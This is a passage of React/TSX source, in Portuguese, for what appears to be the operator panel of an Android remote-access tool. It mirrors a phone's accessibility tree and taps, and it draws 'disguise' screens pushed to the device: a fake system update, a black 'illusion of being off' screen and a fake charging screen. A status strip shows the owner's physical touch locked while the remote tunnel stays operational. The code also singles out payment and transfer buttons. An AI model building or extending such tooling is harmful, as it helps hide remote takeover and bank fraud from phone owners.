                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          marginBottom: "12px"
                        }}
                      >
                        <Layers size={22} style={{ color: "#ef4444" }} />
                      </div>

                      <span style={{ fontSize: "11px", fontWeight: 800, color: "#f87171", letterSpacing: "0.6px", marginBottom: "4px" }}>
                        ESQUELETO 2D INDISPONÍVEL
                      </span>

                      <p style={{ fontSize: "11px", color: "#94a3b8", lineHeight: 1.4, margin: "0", maxWidth: "220px" }}>
                        A inspeção de elementos e acessibilidade requer que o aparelho esteja conectado.
                      </p>
                    </div>
                  )}
                  {/* Synced Touch Feedback Ripples (Simultâneo em Tempo Real) */}
                  {syncedRipples.map((r) => (
                    <span
                      key={r.id}
                      style={{
                        position: "absolute",
                        left: `${r.pctX}%`,
                        top: `${r.pctY}%`,
                        width: "38px",
                        height: "38px",
                        borderRadius: "50%",
                        backgroundColor: r.source === "skeleton" ? "rgba(56, 189, 248, 0.45)" : "rgba(34, 197, 94, 0.45)",
                        border: `2px solid ${r.source === "skeleton" ? "#38bdf8" : "#22c55e"}`,
                        transform: "translate(-50%, -50%)",
                        pointerEvents: "none",
                        boxShadow: `0 0 16px ${r.source === "skeleton" ? "#38bdf8" : "#22c55e"}`,
                        zIndex: 99
                      }}
                    />
                  ))}

                  {/* Active Finger Touch Pointer & Gesture Trail (Skeleton Viewport) */}
                  {activeDrag?.active && (
                    <>
                      <div
                        style={{
                          position: "absolute",
                          left: `${activeDrag.pctCurrentX}%`,
                          top: `${activeDrag.pctCurrentY}%`,
                          width: "36px",
                          height: "36px",
                          borderRadius: "50%",
                          background: "radial-gradient(circle, rgba(56, 189, 248, 0.8) 0%, rgba(56, 189, 248, 0.25) 60%, transparent 75%)",
                          border: "2px solid #38bdf8",
                          transform: "translate(-50%, -50%)",
                          pointerEvents: "none",
                          zIndex: 100,
                          boxShadow: "0 0 16px rgba(56, 189, 248, 0.6)"
                        }}
                      >
                        <div
                          style={{
                            position: "absolute",
                            left: "50%",
                            top: "50%",
                            width: "8px",
                            height: "8px",
                            borderRadius: "50%",
                            background: "#ffffff",
                            transform: "translate(-50%, -50%)",
                            boxShadow: "0 0 8px #ffffff"
                          }}
                        />
                      </div>

                      {Math.hypot(activeDrag.currentX - activeDrag.startX, activeDrag.currentY - activeDrag.startY) > 10 && (
                        <svg
                          style={{
                            position: "absolute",
                            inset: 0,
                            width: "100%",
                            height: "100%",
                            pointerEvents: "none",
                            zIndex: 99
                          }}
                        >
                          <line
                            x1={`${activeDrag.pctStartX}%`}
                            y1={`${activeDrag.pctStartY}%`}
                            x2={`${activeDrag.pctCurrentX}%`}
                            y2={`${activeDrag.pctCurrentY}%`}
                            stroke="#38bdf8"
                            strokeWidth="3"
                            strokeDasharray="4 3"
                            strokeLinecap="round"
                            filter="drop-shadow(0 0 6px #38bdf8)"
                          />
                          <circle
                            cx={`${activeDrag.pctStartX}%`}
                            cy={`${activeDrag.pctStartY}%`}
                            r="5"
                            fill="#22c55e"
                            stroke="#ffffff"
                            strokeWidth="1.5"
                          />
                        </svg>
                      )}
                    </>
                  )}

                  {/* Disguise Wireframe Overlay in Screen 2 (Esqueleto) */}
                  {activeDisguise?.active && !skeletonXRayMode && (
                    <div
                      className="skeleton-disguise-wireframe"
                      style={{
                        position: "absolute",
                        inset: 0,
                        zIndex: 45,
                        display: "flex",
                        flexDirection: "column",
                        alignItems: "center",
                        justifyContent: "space-between",
                        padding: "24px 16px",
                        background: "rgba(5, 8, 16, 0.96)",
                        boxSizing: "border-box",
                        overflow: "hidden"
                      }}
                    >
                      {/* Top Header Tag */}
                      <div
                        style={{
                          width: "100%",
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "space-between",
                          padding: "6px 10px",
                          border: "1px dashed rgba(56, 189, 248, 0.6)",
                          background: "rgba(15, 23, 42, 0.8)",
                          borderRadius: "4px",
                          fontSize: "9px",
                          color: "#38bdf8",
                          fontFamily: "var(--font-mono)",
                          fontWeight: 700
                        }}
                      >
                        <span>[A11Y_WINDOW: DisguiseActivity (ID: 578)]</span>
                        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                          <span style={{ color: "#22c55e" }}>[Z: 9999 · FOREGROUND]</span>
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              setSkeletonXRayMode(true);
                            }}
                            style={{
                              background: "rgba(56, 189, 248, 0.15)",
                              border: "1px solid #38bdf8",
                              borderRadius: "3px",
                              color: "#38bdf8",
                              fontSize: "8.5px",
                              padding: "1px 6px",
                              cursor: "pointer",
                              fontWeight: 700
                            }}
                            title="Alternar para ver nós de acessibilidade de fundo"
                          >
                            👁️ Raio-X Esqueleto
                          </button>
                        </div>
                      </div>

                      {/* Disguise Specific Elements */}
                      {activeDisguise.type === "update" && (
                        <div
                          style={{
                            width: "100%",
                            display: "flex",
                            flexDirection: "column",
                            alignItems: "center",
                            gap: "12px",
                            margin: "auto 0"
                          }}
                        >
                          {/* Spinner Wireframe */}
                          <div
                            style={{
                              width: "74px",
                              height: "74px",
                              borderRadius: "50%",
                              border: "2px dashed #00e5ff",
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "center",
                              position: "relative"
                            }}
                          >
                            <span style={{ fontSize: "20px" }}>📱</span>
                          </div>
                          <span style={{ fontSize: "8.5px", color: "#38bdf8", fontFamily: "var(--font-mono)" }}>
                            [android.widget.ProgressBar (style="spinner", rotate=360°)]
                          </span>

                          {/* Title Wireframe Box */}
                          <div
                            style={{
                              width: "90%",
                              border: "1px solid rgba(0, 229, 255, 0.5)",
                              background: "rgba(0, 229, 255, 0.08)",
                              padding: "6px 8px",
                              borderRadius: "4px",
                              textAlign: "center"
                            }}
                          >
                            <div style={{ fontSize: "7.5px", color: "#67e8f9", fontFamily: "var(--font-mono)", marginBottom: "2px" }}>
                              [android.widget.TextView · title]
                            </div>
                            <div style={{ fontSize: "11px", fontWeight: 700, color: "#ffffff" }}>
                              {activeDisguise.title || "Instalando atualização do sistema..."}
                            </div>
                          </div>

                          {/* Percent Wireframe Box */}
                          <div
                            style={{
                              border: "1px dashed #00e5ff",
                              background: "rgba(0, 229, 255, 0.12)",
                              padding: "4px 14px",
                              borderRadius: "4px",
                              textAlign: "center"
                            }}
                          >
                            <div style={{ fontSize: "7.5px", color: "#67e8f9", fontFamily: "var(--font-mono)" }}>
                              [android.widget.TextView · progress_percent]
                            </div>
                            <div style={{ fontSize: "16px", fontWeight: 800, color: "#00e5ff", fontFamily: "var(--font-mono)" }}>
                              {activeDisguise.progressPercent || 34}%
                            </div>
                          </div>

                          {/* Progress Bar Wireframe Box */}
                          <div
                            style={{
                              width: "85%",
                              border: "1px solid #1e293b",
                              background: "rgba(30, 41, 59, 0.6)",
                              borderRadius: "3px",
                              height: "10px",
                              position: "relative",
                              overflow: "hidden"
                            }}
                          >
                            <div
                              style={{
                                width: `${activeDisguise.progressPercent || 34}%`,
                                height: "100%",
                                background: "#00e5ff"
                              }}
                            />
                            <span
                              style={{
                                position: "absolute",
                                inset: 0,
                                fontSize: "7px",
                                color: "#ffffff",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                fontWeight: 800,
                                fontFamily: "var(--font-mono)"
                              }}
                            >
                              [ProgressBar: {activeDisguise.progressPercent || 34}/100]
                            </span>
                          </div>

                          {/* Subtitle Wireframe Box */}
                          <div
                            style={{
                              width: "90%",
                              border: "1px dashed rgba(148, 163, 184, 0.4)",
                              padding: "6px 8px",
                              borderRadius: "4px",
                              textAlign: "center"
                            }}
                          >
                            <div style={{ fontSize: "7.5px", color: "#94a3b8", fontFamily: "var(--font-mono)", marginBottom: "2px" }}>
                              [android.widget.TextView · description]
                            </div>
                            <div style={{ fontSize: "9.5px", color: "#cbd5e1", lineHeight: 1.3 }}>
                              {activeDisguise.subtitle || "Não desligue o telefone. O sistema será reiniciado automaticamente ao concluir."}
                            </div>
                          </div>
                        </div>
                      )}

                      {activeDisguise.type === "black" && (
                        <div
                          style={{
                            width: "100%",
                            display: "flex",
                            flexDirection: "column",
                            alignItems: "center",
                            gap: "12px",
                            margin: "auto 0"
                          }}
                        >
                          <div
                            style={{
                              width: "60px",
                              height: "60px",
                              borderRadius: "50%",
                              border: "2px dashed #ff1a2a",
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "center"
                            }}
                          >
                            <span style={{ fontSize: "22px" }}>🌑</span>
                          </div>

                          <div
                            style={{
                              width: "90%",
                              border: "1px solid rgba(255, 26, 42, 0.6)",
                              background: "rgba(255, 26, 42, 0.1)",
                              padding: "8px 10px",
                              borderRadius: "4px",
                              textAlign: "center"
                            }}
                          >
                            <div style={{ fontSize: "8px", color: "#ff808b", fontFamily: "var(--font-mono)", marginBottom: "4px" }}>
                              [android.view.View: SurfaceView_OLED_Black]
                            </div>
                            <div style={{ fontSize: "11px", fontWeight: 700, color: "#ffffff" }}>
                              TELA PRETA ATIVA NO APARELHO
                            </div>
                            <div style={{ fontSize: "9px", color: "#cbd5e1", marginTop: "2px" }}>
                              Brilho: 0% · Display Apagado · Ilusão de Desligado
                            </div>
                          </div>
                        </div>
                      )}

                      {activeDisguise.type === "battery" && (
                        <div
                          style={{
                            width: "100%",
                            display: "flex",
                            flexDirection: "column",
                            alignItems: "center",
                            gap: "12px",
                            margin: "auto 0"
                          }}
                        >
                          <div
                            style={{
                              width: "70px",
                              height: "70px",
                              borderRadius: "50%",
                              border: "2px dashed #22c55e",
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "center"
                            }}
                          >
                            <span style={{ fontSize: "24px" }}>⚡</span>
                          </div>

                          <div
                            style={{
                              width: "90%",
                              border: "1px solid rgba(34, 197, 94, 0.6)",
                              background: "rgba(34, 197, 94, 0.1)",
                              padding: "8px 10px",
                              borderRadius: "4px",
                              textAlign: "center"
                            }}
                          >
                            <div style={{ fontSize: "8px", color: "#86efac", fontFamily: "var(--font-mono)", marginBottom: "4px" }}>
                              [android.widget.ImageView: BatteryChargingRing]
                            </div>
                            <div style={{ fontSize: "14px", fontWeight: 800, color: "#22c55e", fontFamily: "var(--font-mono)" }}>
                              Carregando {device.battery || 84}%
                            </div>
                            <div style={{ fontSize: "9px", color: "#86efac", marginTop: "2px" }}>
                              Carregamento Rápido Ativo
                            </div>
                          </div>
                        </div>
                      )}

                      {/* Bottom Tactical Security Strip */}
                      <div
                        style={{
                          width: "100%",
                          display: "flex",
                          flexDirection: "column",
                          gap: "4px",
                          border: "1px dashed rgba(239, 68, 68, 0.5)",
                          background: "rgba(239, 68, 68, 0.08)",
                          borderRadius: "4px",
                          padding: "6px 8px",
                          fontSize: "8.5px",
                          color: "#fca5a5",
                          fontFamily: "var(--font-mono)"
                        }}
                      >
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                          <span>[SECURITY_FILTER: PhysicalTouchDisabler]</span>
                          <span style={{ color: "#ef4444", fontWeight: 800 }}>TRAVADO (DROPPED)</span>
                        </div>
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                          <span>[REMOTE_TUNNEL: DVIEW Operational Stream]</span>
                          <span style={{ color: "#22c55e", fontWeight: 800 }}>100% OPERACIONAL</span>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Wireframe Floating Reset Tag if in Skeleton X-Ray */}
                  {activeDisguise?.active && skeletonXRayMode && (
                    <div
                      style={{
                        position: "absolute",
                        top: "8px",
                        left: "50%",
                        transform: "translateX(-50%)",
                        background: "rgba(10, 14, 23, 0.94)",
                        border: "1px solid #00e5ff",
                        borderRadius: "14px",
                        padding: "3px 10px",
                        display: "flex",
                        alignItems: "center",
                        gap: "6px",
                        fontSize: "9.5px",
                        color: "#e0f2fe",
                        zIndex: 50,
                        cursor: "pointer"
                      }}
                      onClick={() => setSkeletonXRayMode(false)}
                      title="Clique para voltar a exibir o esqueleto do disfarce ativo"
                    >
                      <span>⚡ Disfarce Ativo ({activeDisguise.type})</span>
                      <span style={{ color: "#38bdf8", fontWeight: 800 }}>[Voltar ao Esqueleto do Disfarce]</span>
                    </div>
                  )}

                  {/* Push Notification Wireframe Banner on Esqueleto */}
                  {activePushBanner && (
                    <div
                      style={{
                        position: "absolute",
                        top: "8px",
                        left: "8px",
                        right: "8px",
                        background: "rgba(10, 14, 23, 0.95)",
                        border: "1.5px dashed #fbbf24",
                        borderRadius: "10px",
                        padding: "8px 10px",
                        zIndex: 110,
                        display: "flex",
                        alignItems: "flex-start",
                        gap: "8px",
                        boxShadow: "0 4px 14px rgba(0,0,0,0.8)"
                      }}
                      title="[A11Y_HEADS_UP_NOTIFICATION] Notificação Ativa no Aparelho"
                    >
                      <div style={{ flexShrink: 0, marginTop: "2px" }}>
                        <AppLogo name={activePushBanner.appName} packageName={activePushBanner.packageName} size={22} />
                      </div>
                      <div style={{ flex: 1, minWidth: 0, fontFamily: "var(--font-mono)" }}>
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "2px" }}>
                          <span style={{ fontSize: "8.5px", fontWeight: 800, color: "#fbbf24" }}>
                            [A11Y_NOTIFICATION: {activePushBanner.appName}]
                          </span>
                          <span style={{ fontSize: "7.5px", color: "#94a3b8", background: "rgba(251, 191, 36, 0.15)", border: "1px solid #fbbf24", padding: "1px 4px", borderRadius: "3px" }}>
                            HEADS-UP
                          </span>
                        </div>
                        <div style={{ fontSize: "10.5px", fontWeight: 700, color: "#ffffff", marginBottom: "1px" }}>
                          {activePushBanner.title}
                        </div>
                        <div style={{ fontSize: "9px", color: "#94a3b8", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                          {activePushBanner.message}
                        </div>
                      </div>
                    </div>
                  )}

                  {a11yNodes.length === 0 ? (
                    <div style={{ margin: "auto", textAlign: "center", color: "#64748b", fontSize: "12px", padding: "20px" }}>
                      Nenhum elemento inspecionado. Clique no botão de atualizar no topo para sincronizar a tela esqueleto.
                    </div>
                  ) : (() => {
                    // Pre-collect bounds of cards and bottom tabs to prevent child nodes from drawing overlapping boxes
                    const activeCardBounds = a11yNodes
                      .filter((n) => {
                        const da = detectAppFromNode(n, resolvedActiveApp);
                        const b = parseBounds(n.bounds);
                        return Boolean(da) && Boolean(b && b.width >= 160 && b.height >= 50);
                      })
                      .map((n) => parseBounds(n.bounds)!)
                      .filter(Boolean);

                    return a11yNodes.map((node) => {
                      const b = parseBounds(node.bounds);
                      if (!b) return null;
                      const isSelected = inspectedNode?.id === node.id;
                      const shortClass = node.className.split(".").pop() || "Elemento";
                      const rawTitle = sanitizeA11yText(node.text || node.contentDescription || "");
                      const detectedApp = detectAppFromNode(node, resolvedActiveApp);

                      // Check if this node is an inner child inside a recognized app card
                      const isChildOfCard = !detectedApp && activeCardBounds.some((cb) => (
                        b.left >= cb.left - 4 &&
                        b.right <= cb.right + 4 &&
                        b.top >= cb.top - 4 &&
                        b.bottom <= cb.bottom + 4
                      ));
                      if (isChildOfCard && !isSelected) {
                        return null; // Don't draw clutter boxes over app cards
                      }

                      // Skip system status bar nodes or bottom nav children without text
                      if (!isSelected && !rawTitle && (b.topPercent <= 4 || b.topPercent >= 90)) {
                        return null;
                      }

                      // 1. Layout Container (ViewGroup, FrameLayout, LinearLayout, RecyclerView, etc.)
                      const isLayoutWrapper =
                        (node.className.endsWith("Layout") ||
                         node.className.endsWith("ViewGroup") ||
                         node.className.endsWith("RecyclerView") ||
                         node.className.endsWith("ScrollView") ||
                         node.className.endsWith("ViewPager")) &&
                        !rawTitle &&
                        !node.clickable;
                      const isLargeContainer = b.width > 300 && b.height > 140 && !rawTitle;

                      if (isLayoutWrapper || isLargeContainer) {
                        return (
                          <div
                            key={node.id}
                            style={{
                              position: "absolute",
                              left: `${b.leftPercent}%`,
                              top: `${b.topPercent}%`,
                              width: `${b.widthPercent}%`,
                              height: `${b.heightPercent}%`,
                              border: isSelected
                                ? "2px dashed #00f0ff"
                                : "1px dashed rgba(56, 189, 248, 0.16)",
                              backgroundColor: isSelected ? "rgba(0, 240, 255, 0.08)" : "transparent",
                              pointerEvents: "none",
                              zIndex: isSelected ? 30 : 1,
                              boxSizing: "border-box"
                            }}
                          >
                            {isSelected && (
                              <span style={{ fontSize: "8px", color: "#00f0ff", fontFamily: "var(--font-mono)", fontWeight: 700, padding: "2px" }}>
                                {shortClass}
                              </span>
                            )}
                          </div>
                        );
                      }

                      // 2. Application Identity Node (App Card or Launcher Icon with Real App Logo)
                      if (detectedApp) {
                        const isCard = b.width >= 160 && b.height >= 50;
                        if (isCard) {
                          return (
                            <div
                              key={node.id}
                              title={`Aplicativo: ${detectedApp.name} (${node.bounds})`}
                              style={{
                                position: "absolute",
                                left: `${b.leftPercent}%`,
                                top: `${b.topPercent}%`,
                                width: `${b.widthPercent}%`,
                                height: `${b.heightPercent}%`,
                                border: isSelected ? "2px solid #00f0ff" : "1.5px solid rgba(56, 189, 248, 0.45)",
                                background: isSelected
                                  ? "linear-gradient(135deg, rgba(8, 28, 52, 0.98) 0%, rgba(15, 23, 42, 0.95) 100%)"
                                  : "linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(22, 30, 48, 0.9) 100%)",
                                boxShadow: isSelected ? "0 0 18px rgba(0, 240, 255, 0.65)" : "0 3px 10px rgba(0,0,0,0.5)",
                                borderRadius: "10px",
                                display: "flex",
                                alignItems: "center",
                                padding: "0 12px",
                                gap: "12px",
                                pointerEvents: "none",
                                zIndex: isSelected ? 35 : 22,
                                boxSizing: "border-box",
                                transition: "all 0.15s ease"
                              }}
                            >
                              <div
                                style={{
                                  width: `${Math.min(42, Math.max(28, b.height - 18))}px`,
                                  height: `${Math.min(42, Math.max(28, b.height - 18))}px`,
                                  borderRadius: "10px",
                                  background: "rgba(30, 41, 59, 0.9)",
                                  border: "1px solid rgba(56, 189, 248, 0.35)",
                                  display: "flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  boxShadow: "0 0 10px rgba(56, 189, 248, 0.2)",
                                  flexShrink: 0
                                }}
                              >
                                <AppLogo
                                  name={detectedApp.name}
                                  packageName={detectedApp.packageName}
                                  size={Math.min(28, b.height - 24)}
                                />
                              </div>
                              <div style={{ flex: 1, minWidth: 0 }}>
                                <div
                                  style={{
                                    fontSize: b.height > 60 ? "12px" : "11px",
                                    fontWeight: 800,
                                    color: "#f8fafc",
                                    overflow: "hidden",
                                    textOverflow: "ellipsis",
                                    whiteSpace: "nowrap"
                                  }}
                                >
                                  {detectedApp.name}
                                </div>
                                <div
                                  style={{
                                    fontSize: "9.5px",
                                    color: "#94a3b8",
                                    fontFamily: "var(--font-mono)",
                                    overflow: "hidden",
                                    textOverflow: "ellipsis",
                                    whiteSpace: "nowrap"
                                  }}
                                >
                                  {rawTitle && rawTitle !== detectedApp.name ? rawTitle : detectedApp.packageName}
                                </div>
                              </div>
                              <span
                                style={{
                                  fontSize: "8px",
                                  fontWeight: 800,
                                  color: "#22c55e",
                                  background: "rgba(34, 197, 94, 0.15)",
                                  border: "1px solid rgba(34, 197, 94, 0.3)",
                                  padding: "2px 6px",
                                  borderRadius: "4px",
                                  flexShrink: 0
                                }}
                              >
                                APP
                              </span>
                            </div>
                          );
                        }

                        // Compact App Icon (Grid / Launcher item)
                        return (
                          <div
                            key={node.id}
                            title={`Aplicativo: ${detectedApp.name} (${node.bounds})`}
                            style={{
                              position: "absolute",
                              left: `${b.leftPercent}%`,
                              top: `${b.topPercent}%`,
                              width: `${b.widthPercent}%`,
                              height: `${b.heightPercent}%`,
                              border: isSelected ? "2px solid #00f0ff" : "1px solid rgba(56, 189, 248, 0.35)",
                              backgroundColor: isSelected ? "rgba(0, 240, 255, 0.18)" : "rgba(15, 23, 42, 0.8)",
                              boxShadow: isSelected ? "0 0 14px rgba(0, 240, 255, 0.6)" : "0 2px 6px rgba(0,0,0,0.35)",
                              borderRadius: "10px",
                              display: "flex",
                              flexDirection: "column",
                              alignItems: "center",
                              justifyContent: "center",
                              padding: "3px 4px",
                              gap: "3px",
                              pointerEvents: "none",
                              zIndex: isSelected ? 30 : 20,
                              boxSizing: "border-box",
                              transition: "all 0.15s ease"
                            }}
                          >
                            <AppLogo
                              name={detectedApp.name}
                              packageName={detectedApp.packageName}
                              size={Math.min(36, Math.max(20, b.height * 0.52))}
                            />
                            <span
                              style={{
                                fontSize: "9.5px",
                                fontWeight: 700,
                                color: isSelected ? "#00f0ff" : "#f8fafc",
                                textAlign: "center",
                                maxWidth: "100%",
                                overflow: "hidden",
                                textOverflow: "ellipsis",
                                whiteSpace: "nowrap"
                              }}
                            >
                              {detectedApp.name}
                            </span>
                          </div>
                        );
                      }

                      // 3. Input Field (EditText, SearchEditText)
                      const isInput =
                        node.className.includes("EditText") ||
                        node.className.includes("AutoCompleteTextView") ||
                        node.className.includes("TextInputEditText") ||
                        node.className.includes("SearchEditText");

                      if (isInput) {
                        return (
                          <div
                            key={node.id}
                            title={`Campo de Digitação: ${rawTitle || "Pesquisar"} (${node.bounds})`}
                            style={{
                              position: "absolute",
                              left: `${b.leftPercent}%`,
                              top: `${b.topPercent}%`,
                              width: `${b.widthPercent}%`,
                              height: `${b.heightPercent}%`,
                              border: isSelected ? "2px solid #00f0ff" : "1.5px solid rgba(0, 240, 255, 0.65)",
                              backgroundColor: isSelected ? "rgba(8, 20, 36, 0.96)" : "rgba(8, 14, 26, 0.9)",
                              boxShadow: isSelected ? "0 0 16px rgba(0, 240, 255, 0.55)" : "0 2px 10px rgba(0, 0, 0, 0.5)",
                              borderRadius: b.height > 45 ? "18px" : "8px",
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "space-between",
                              padding: "0 12px",
                              pointerEvents: "none",
                              zIndex: isSelected ? 35 : 22,
                              boxSizing: "border-box",
                              transition: "all 0.15s ease"
                            }}
                          >
                            <div style={{ display: "flex", alignItems: "center", gap: "8px", minWidth: 0, flex: 1 }}>
                              <Search size={13} style={{ color: "#00f0ff", flexShrink: 0 }} />
                              <span
                                style={{
                                  fontSize: "11px",
                                  color: "#f8fafc",
                                  fontWeight: 600,
                                  overflow: "hidden",
                                  textOverflow: "ellipsis",
                                  whiteSpace: "nowrap"
                                }}
                              >
                                {rawTitle || "Pesquisar apps e jogos"}
                              </span>
                              {isSelected && (
                                <span style={{ color: "#00f0ff", fontWeight: 700, animation: "pulse 1s infinite" }}>|</span>
                              )}
                            </div>
                            <div style={{ width: "20px", height: "20px", borderRadius: "50%", background: "#a855f7", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontSize: "10px", fontWeight: "bold", flexShrink: 0 }}>
                              R
                            </div>
                          </div>
                        );
                      }

                      // 4. Action Buttons (Button, primary CTAs, clickable text buttons)
                      const isActionButton =
                        node.className.endsWith("Button") ||
                        (node.clickable && b.height >= 26 && b.width >= 70 && Boolean(rawTitle) && !node.className.includes("Image"));

                      if (isActionButton && rawTitle) {
                        const isPrimary =
                          /confirmar|avançar|continuar|entrar|acessar|pagar|transferir|enviar|salvar|concluir|ok|sim|instalar|abrir/i.test(rawTitle);
                        return (
                          <div
                            key={node.id}
                            title={`Botão de Ação: ${rawTitle} (${node.bounds})`}
                            style={{
                              position: "absolute",
                              left: `${b.leftPercent}%`,
                              top: `${b.topPercent}%`,
                              width: `${b.widthPercent}%`,
                              height: `${b.heightPercent}%`,
                              border: isSelected
                                ? "2px solid #00f0ff"
                                : isPrimary
                                ? "1.5px solid #38bdf8"
                                : "1.5px solid rgba(56, 189, 248, 0.65)",
                              background: isPrimary
                                ? "linear-gradient(135deg, rgba(2, 132, 199, 0.95) 0%, rgba(14, 165, 233, 0.85) 100%)"
                                : "linear-gradient(135deg, rgba(15, 23, 42, 0.92) 0%, rgba(30, 41, 59, 0.85) 100%)",
                              boxShadow: isSelected
                                ? "0 0 16px rgba(0, 240, 255, 0.6)"
                                : isPrimary
                                ? "0 4px 12px rgba(14, 165, 233, 0.4)"
                                : "0 3px 8px rgba(0, 0, 0, 0.45)",
                              borderRadius: "8px",
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "center",
                              padding: "2px 8px",
                              pointerEvents: "none",
                              zIndex: isSelected ? 35 : 25,
                              boxSizing: "border-box",
                              transition: "all 0.15s ease",
                              userSelect: "none"
                            }}
                          >
                            <span
                              style={{
                                fontSize: b.height > 40 ? "12px" : "11px",
                                fontWeight: 800,
                                color: isPrimary ? "#ffffff" : isSelected ? "#00f0ff" : "#f8fafc",
                                textAlign: "center",
                                textTransform: isPrimary ? "uppercase" : "none",
                                letterSpacing: isPrimary ? "0.6px" : "normal",
                                overflow: "hidden",
                                textOverflow: "ellipsis",
                                whiteSpace: "nowrap"
                              }}
                            >
                              {rawTitle}
                            </span>
                          </div>
                        );
                      }

                      // 5. Clickable Icon / Navigation Button
                      const isClickableIcon = node.clickable && (node.className.includes("Image") || (b.width <= 55 && b.height <= 55));
                      if (isClickableIcon && !rawTitle) {
                        const desc = (node.contentDescription || node.name || "").toLowerCase();
                        const isBack = desc.includes("voltar") || desc.includes("back") || desc.includes("anterior");
                        const isClose = desc.includes("fechar") || desc.includes("close") || desc.includes("cancelar");
                        const isSearchIcon = desc.includes("pesquisar") || desc.includes("search") || desc.includes("busca");

                        return (
                          <div
                            key={node.id}
                            title={`Ícone Interativo: ${node.contentDescription || node.name || "Ação"} (${node.bounds})`}
                            style={{
                              position: "absolute",
                              left: `${b.leftPercent}%`,
                              top: `${b.topPercent}%`,
                              width: `${b.widthPercent}%`,
                              height: `${b.heightPercent}%`,
                              border: isSelected ? "2px solid #00f0ff" : "1.5px solid rgba(56, 189, 248, 0.45)",
                              backgroundColor: isSelected ? "rgba(0, 240, 255, 0.2)" : "rgba(15, 23, 42, 0.8)",
                              boxShadow: isSelected ? "0 0 14px rgba(0, 240, 255, 0.6)" : "0 2px 8px rgba(0,0,0,0.4)",
                              borderRadius: "8px",
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "center",
                              pointerEvents: "none",
                              zIndex: isSelected ? 30 : 20,
                              boxSizing: "border-box",
                              transition: "all 0.15s ease"
                            }}
                          >
                            {isBack ? (
                              <ChevronLeft size={Math.min(16, b.height * 0.55)} style={{ color: "#38bdf8" }} />
                            ) : isClose ? (
                              <X size={Math.min(16, b.height * 0.55)} style={{ color: "#ef4444" }} />
                            ) : isSearchIcon ? (
                              <Search size={Math.min(14, b.height * 0.55)} style={{ color: "#38bdf8" }} />
                            ) : (
                              <MousePointer size={Math.min(14, b.height * 0.55)} style={{ color: "#38bdf8" }} />
                            )}
                          </div>
                        );
                      }

                      // 6. Text Elements, Category Grid Tiles, Section Headers & Labels
                      const lowerTitle = rawTitle.toLowerCase().trim();
                      const categoryIcons: Record<string, string> = {
                        "ação": "⚔️",
                        "simulador": "🕹️",
                        "quebra-cabeças": "🧩",
                        "aventura": "🧭",
                        "corrida": "🏎️",
                        "rpg": "🛡️",
                        "estratégia": "🚩",
                        "esportes": "⚽",
                        "cartas": "🃏",
                        "tabuleiros": "♟️",
                        "educativos": "🎓",
                        "palavras": "🔤",
                        "jogos": "🎮",
                        "apps": "📱",
                        "pesquisa": "🔍",
                        "livros": "📚",
                        "você": "👤",
                        "crianças": "⭐"
                      };
                      const catIcon = categoryIcons[lowerTitle];
                      const isSectionHeader =
                        !node.clickable &&
                        (lowerTitle.startsWith("explorar") ||
                         lowerTitle.startsWith("patrocinad") ||
                         lowerTitle.startsWith("sugest") ||
                         lowerTitle.startsWith("recomend"));

                      const isCategoryTile = Boolean(catIcon) && (node.clickable || b.height <= 55) && b.topPercent < 85;
                      const isBottomTab = b.topPercent >= 85 && (lowerTitle === "jogos" || lowerTitle === "apps" || lowerTitle === "pesquisa" || lowerTitle === "livros" || lowerTitle === "você" || lowerTitle === "crianças");

                      if (isSectionHeader) {
                        return (
                          <div
                            key={node.id}
                            title={`Título de Seção: ${rawTitle}`}
                            style={{
                              position: "absolute",
                              left: `${b.leftPercent}%`,
                              top: `${b.topPercent}%`,
                              width: `${b.widthPercent}%`,
                              height: `${b.heightPercent}%`,
                              display: "flex",
                              alignItems: "center",
                              padding: "0 6px",
                              zIndex: 15,
                              pointerEvents: "none"
                            }}
                          >
                            <span
                              style={{
                                fontSize: "12px",
                                fontWeight: 800,
                                color: "#f8fafc",
                                letterSpacing: "0.2px"
                              }}
                            >
                              {rawTitle}
                            </span>
                          </div>
                        );
                      }

                      if (isBottomTab) {
                        const isActiveTab = lowerTitle === "pesquisa" || node.selected;
                        return (
                          <div
                            key={node.id}
                            title={`Aba: ${rawTitle}`}
                            style={{
                              position: "absolute",
                              left: `${b.leftPercent}%`,
                              top: `${b.topPercent}%`,
                              width: `${b.widthPercent}%`,
                              height: `${b.heightPercent}%`,
                              display: "flex",
                              flexDirection: "column",
                              alignItems: "center",
                              justifyContent: "center",
                              gap: "2px",
                              background: isActiveTab ? "rgba(56, 189, 248, 0.15)" : "transparent",
                              borderTop: isActiveTab ? "2px solid #38bdf8" : "none",
                              zIndex: 28,
                              pointerEvents: "none"
                            }}
                          >
                            <span style={{ fontSize: "14px" }}>{catIcon || "📱"}</span>
                            <span
                              style={{
                                fontSize: "9px",
                                fontWeight: isActiveTab ? 800 : 600,
                                color: isActiveTab ? "#38bdf8" : "#94a3b8"
                              }}
                            >
                              {rawTitle}
                            </span>
                          </div>
                        );
                      }

                      if (isCategoryTile) {
                        return (
                          <div
                            key={node.id}
                            title={`Categoria: ${rawTitle} (${node.bounds})`}
                            style={{
                              position: "absolute",
                              left: `${b.leftPercent}%`,
                              top: `${b.topPercent}%`,
                              width: `${b.widthPercent}%`,
                              height: `${b.heightPercent}%`,
                              border: isSelected ? "2px solid #00f0ff" : "1px solid rgba(56, 189, 248, 0.35)",
                              background: isSelected
                                ? "linear-gradient(135deg, rgba(8, 28, 52, 0.98) 0%, rgba(15, 23, 42, 0.95) 100%)"
